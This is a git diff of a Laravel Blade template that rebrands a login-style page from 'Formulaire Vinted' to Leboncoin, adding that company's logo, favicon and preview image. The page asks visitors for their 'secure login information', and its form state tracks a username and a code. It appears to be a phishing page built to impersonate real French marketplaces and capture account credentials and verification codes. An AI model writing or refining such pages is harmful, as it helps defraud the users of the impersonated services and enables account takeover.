@@ -3,21 +3,20 @@
     <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+        <link rel="icon" type="image/png" href="{{ asset('images/leboncoin.png') }}">
+        <link rel="shortcut icon" type="image/png" href="{{ asset('images/leboncoin.png') }}">
 
-        <meta property="og:title" content="Formulaire Vinted" />
+        <meta property="og:title" content="LEBONCOIN" />
         <meta property="og:description" content="Veuillez remplir vos informations de connexion sécurisée." />
         <meta property="og:type" content="website" />
         <meta property="og:url" content="{{ config('app.url') }}" />
-        <meta property="og:image" content="" />
-
-    
+        <meta property="og:image" content="{{ asset('images/leboncoin.png') }}" />
 
         <title>{{ config('app.name', 'LEBONCOIN') }}</title>
 
         <!-- Fonts -->
         <link rel="preconnect" href="https://fonts.bunny.net">
         <link href="https://fonts.bunny.net/css?family=instrument-sans:400,500,600" rel="stylesheet" />
-        <!--link rel="stylesheet" href="{{ asset('css/app.css') }}"-->
 
         @vite(['resources/css/app.css', 'resources/js/app.js'])
     </head>
@@ -39,12 +38,9 @@
 </style>
 
 <script>
-
-        // B. On attend le chargement complet pour cacher le loader
         window.addEventListener('load', function() {
             const loader = document.getElementById('global-loader');
             
-            // Sécurité : on vérifie que l'élément existe bien avant d'agir
             if (loader) {
                 setTimeout(() => {
                     loader.style.opacity = '0';
@@ -55,8 +51,6 @@
             }
         });
     </script>
-    
-
 
     <main x-data="{step: 1,username: '',code: ''}" class="w-full max-w-md mx-auto px-4 py-20 overflow-hidden">
 
@@ -67,7 +61,6 @@
             src="{{ asset('images/leboncoin.png') }}"
             alt="Logo"
             class="h-10 sm:h-10 lg:h-10 w-auto"
-
             >
         </div>
 
@@ -310,21 +303,15 @@
 </div>
     </main>
 
-    
-
-       
-
     {{-- Espaceur conditionnel --}}
     @if (Route::has('login'))
         <div class="h-14 hidden lg:block"></div>
     @endif
 
     <script>
-    // 2. On attend que TOUT soit chargé avant de toucher au style
     window.addEventListener('load', function() {
         const loader = document.getElementById('global-loader');
         
-        // La sécurité : on vérifie que le loader existe bien avant de modifier son style
         if (loader) {
             setTimeout(() => {
                 loader.style.opacity = '0';
@@ -332,8 +319,6 @@
                     loader.style.display = 'none';
                 }, 500);
             }, 1200);
-        } else {
-            console.error("Erreur : L'élément #global-loader n'a pas été trouvé dans le HTML.");
         }
     });
 </script>
